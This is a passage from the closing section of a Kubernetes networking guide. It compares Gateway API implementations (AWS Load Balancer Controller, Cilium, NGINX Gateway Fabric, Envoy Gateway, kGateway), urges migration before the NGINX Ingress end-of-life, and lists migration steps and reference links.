**AWS Native (LBC v3)** — Minimal operational overhead, managed ALB/NLB, SLA guaranteed, AWS WAF/Shield/ACM integration. Best for AWS-only environments prioritizing stability over performance.

</TabItem>
<TabItem value="cilium" label="High Performance">

**Cilium Gateway API** — Ultra-low latency (P99 under 10ms), eBPF networking, Hubble L7 observability, ENI mode VPC-native integration. Best for high-performance and service mesh environments.

</TabItem>
<TabItem value="nginx" label="NGINX Experience">

**NGINX Gateway Fabric** — Leverage existing NGINX knowledge, proven stability, F5 enterprise support, multi-cloud. Best for teams with NGINX experience needing fast migration.

</TabItem>
<TabItem value="envoy" label="CNCF Standard">

**Envoy Gateway** — CNCF standard, Istio compatible, rich L7 features (mTLS, ExtAuth, Rate Limiting, Circuit Breaking). Best for environments planning service mesh expansion.

</TabItem>
<TabItem value="kgateway" label="AI/ML Integration">

**kGateway** — Unified gateway (API+mesh+AI+MCP), AI/ML workload routing, Solo.io enterprise support. Best for environments needing specialized AI/ML routing.

</TabItem>
</Tabs>

### 9.2 Future Expansion Roadmap

<RoadmapTimeline locale="en" />

### 9.3 Key Message

:::info
**Complete migration before March 2026 NGINX Ingress EOL to eliminate security threats at the source.**

Gateway API is not just an Ingress replacement, but the future of cloud-native traffic management.
- **Role Separation**: Clear separation of responsibilities between platform and development teams
- **Standardization**: Portable configuration without vendor lock-in
- **Extensibility**: Expansion to East-West, service mesh, and AI integration
:::

**Start Now:**
1. Collect current Ingress inventory (Migration Execution Strategy document)
2. Select solution matching your workload (Section 9.1)
3. Build PoC environment (Migration Execution Strategy document)
4. Execute gradual migration (Migration Execution Strategy document)

**Additional Resources:**
- [Gateway API Official Documentation](https://gateway-api.sigs.k8s.io/)
- [Cilium Official Documentation](https://docs.cilium.io/)
- [NGINX Gateway Fabric](https://docs.nginx.com/nginx-gateway-fabric/)
- [Envoy Gateway](https://gateway.envoyproxy.io/)
- [AWS Load Balancer Controller](https://kubernetes-sigs.github.io/aws-load-balancer-controller/)

---

## Related Documents

- [2. CoreDNS Monitoring & Optimization](../coredns-monitoring-optimization.md)
- [3. East-West Traffic Optimization](../east-west-traffic-best-practice.md)
- [4. Karpenter Ultra-Fast Auto-Scaling](../karpenter-autoscaling.md)
- [Kubernetes Gateway API Official Documentation](https://gateway-api.sigs.k8s.io/)
- [AWS Load Balancer Controller](https://kubernetes-sigs.github.io/aws-load-balancer-controller/)
- [Cilium Gateway API Documentation](https://docs.cilium.io/en/stable/network/servicemesh/gateway-api/gateway-api/)
- [NGINX Gateway Fabric](https://docs.nginx.com/nginx-gateway-fabric/)
- [Envoy Gateway](https://gateway.envoyproxy.io/)
- [kGateway](https://k8sgateway.io/)
